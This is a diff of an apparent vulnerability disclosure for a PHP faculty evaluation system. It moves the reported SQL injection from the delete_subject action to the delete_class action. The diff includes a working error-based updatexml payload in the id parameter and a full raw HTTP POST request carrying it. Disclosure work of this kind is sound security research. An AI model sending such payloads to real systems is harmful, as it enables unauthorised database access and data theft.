@@ -8,16 +8,16 @@ vendors: https://www.sourcecodester.com/php/14635/faculty-evaluation-system-usin
 
 The program is built using the xmapp-php8.1 version
 
-Vulnerability File: /eval/ajax.php?action=delete_subject
+Vulnerability File: /eval/ajax.php?action=delete_class
 
-Vulnerability location: /eval/ajax.php?action=delete_subject, id
+Vulnerability location: /eval/ajax.php?action=delete_class, id
 
 dbname =evaluation_db
 
-[+] Payload: id=2 and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id
+[+] Payload: id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id
 
 ```sql
-POST /eval/ajax.php?action=delete_subject HTTP/1.1
+POST /eval/ajax.php?action=delete_class HTTP/1.1
 Host: 192.168.1.88
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
 Accept: */*
@@ -26,12 +26,12 @@ Accept-Encoding: gzip, deflate
 DNT: 1
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 X-Requested-With: XMLHttpRequest
-Referer: http://192.168.1.88/eval/index.php?page=subject_list
+Referer: http://192.168.1.88/eval/index.php?page=class_list
 Content-Length: 64
 Cookie: PHPSESSID=lrrse02i69soj9l3lnarhnd9ck
 Connection: close
 
-id=2 and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
+id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
 ```
 
-![image](https://user-images.githubusercontent.com/54017627/233828036-e84eaf70-200d-4ccf-9d6f-fa68fca5b725.png)
+![image](https://user-images.githubusercontent.com/54017627/233828085-a6bb494e-dafe-4bcb-8e07-84f7f3267f9e.png)
